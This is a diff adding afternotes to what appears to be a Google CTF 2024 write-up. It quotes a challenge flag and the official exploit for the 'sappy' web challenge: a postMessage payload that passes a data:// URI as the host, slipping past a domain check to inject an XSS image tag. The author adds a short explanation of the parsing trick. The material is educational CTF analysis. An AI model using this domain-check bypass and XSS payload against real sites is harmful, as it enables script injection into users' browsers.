@@ -432,3 +432,15 @@ for i_strike in range(5):
 After all this, we can simply use a `a85 hex` to get the flag out.
 
 > CTF{nonc4nonical_3ncod1ngs_g00d_for_stego_g00d_for_pwn}
+
+## Afternotes...
+[Official Writeups](https://github.com/google/google-ctf/blob/main/2024/quals/web-sappy/exploit)
+
+### web - sappy:
+
+Official Exploits:
+```js
+window.postMessage('{"method": "initialize","host": "data://sappy-web.2024.ctfcompetition.com/,{\\"html\\":\\"<img src=x onerror=alert(1)>"}');window.postMessage('{"method": "render", "page": "page1\\"}"}')
+```
+
+I didn't know that `data://` scheme is supported by browsers. The mime type field would be parsed as domain in `goog.Uri`. This host would bypass the domain check when rendering, and can return any json.
